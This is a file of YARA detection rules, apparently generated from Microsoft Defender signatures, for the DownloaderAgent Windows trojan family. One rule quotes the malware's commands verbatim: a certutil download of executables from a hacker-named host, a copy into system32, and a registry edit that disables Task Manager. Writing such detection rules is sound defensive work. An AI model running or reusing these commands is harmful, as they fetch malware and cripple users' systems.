rule Trojan_Win32_DownloaderAgent_PA_2147742804_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/DownloaderAgent.PA!MTB"
        threat_id = "2147742804"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "DownloaderAgent"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 55 00 8d ac 24 1c 01 00 00 89 54 24 04 0f b6 14 02 88 14 24 8d 56 01 89 d7 c1 ff 1f c1 ef 18 8d 74 3e 01 81 e6 00 ff ff ff 29 f2 0f b6 7c 14 08 01 f9 89 ce c1 fe 1f c1 ee 18 01 ce 81 e6 00 ff ff ff 29 f1 0f b6 5c 0c 08 88 5c 14 08 89 fb 88 5c 0c 08 0f b6 5c 14 08 01 fb 0f b6 f3 8a 3c 24 32 7c 34 08 8b 74 24 04 88 3c 06 40 89 d6 3b 45 04 7c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_DownloaderAgent_PA_2147742804_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/DownloaderAgent.PA!MTB"
        threat_id = "2147742804"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "DownloaderAgent"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "certutil.exe -urlcache -split -f http://down.us-hack.ru/wget.exe" ascii //weight: 1
        $x_1_2 = "copy /y wget.exe %windir%\\system32\\" ascii //weight: 1
        $x_1_3 = "taskkill /im svshosb.exe -f" ascii //weight: 1
        $x_1_4 = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v '\"DisableTaskMgr\" /d 1 /t REG_DWORD /f" ascii //weight: 1
        $x_1_5 = "wget http://down.us-hack.ru/agwl.exe" ascii //weight: 1
        $x_1_6 = "C:\\Windows\\Tasks\\hook\\svchosts.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_DownloaderAgent_PB_2147751937_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/DownloaderAgent.PB!MTB"
        threat_id = "2147751937"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "DownloaderAgent"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {8b 54 24 0c 59 8b 4c 24 04 8b c1 0b 4c 24 08 f7 d0 f7 d2 0b c2 23 c1 c3}  //weight: 5, accuracy: High
        $x_1_2 = {8b 44 24 04 56 8b 74 24 0c 0f b6 08 8a 16 88 0e 88 10 5e c3}  //weight: 1, accuracy: High
        $x_9_3 = {8b 45 f8 8b 75 14 0f be 04 30 50 ff 75 08 e8 ?? ?? ?? ff 83 c4 24 88 06 46 ff 4d 10 89 75 14 0f 85 ?? ff ff ff}  //weight: 9, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

